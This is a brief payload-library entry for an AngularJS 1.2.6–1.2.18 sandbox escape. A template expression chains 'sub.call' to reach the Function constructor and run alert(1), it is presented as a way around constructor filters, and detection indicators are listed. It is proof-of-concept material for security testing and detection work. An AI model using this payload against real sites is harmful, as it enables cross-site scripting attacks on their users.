---
type: code
language: JavaScript
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - xss
  - call-chain
  - angularjs
platforms:
  - Web
validated: true
---

# AngularJS-Sub-Call-Constructor-Invoke

## Code

```javascript
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

## Description

Chains substring.call to access constructor descriptor and invoke alert(1) in AngularJS 1.2.6-1.2.18.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Deep call chain. | N/A |

## Usage

For strict constructor filters.

## Detection

- getOwnPropertyDescriptor usage.
- sub.call patterns.

## Related

- [[procedures/Angular-AngularJS-Stored-Reflected-XSS-Simple-Alert]]
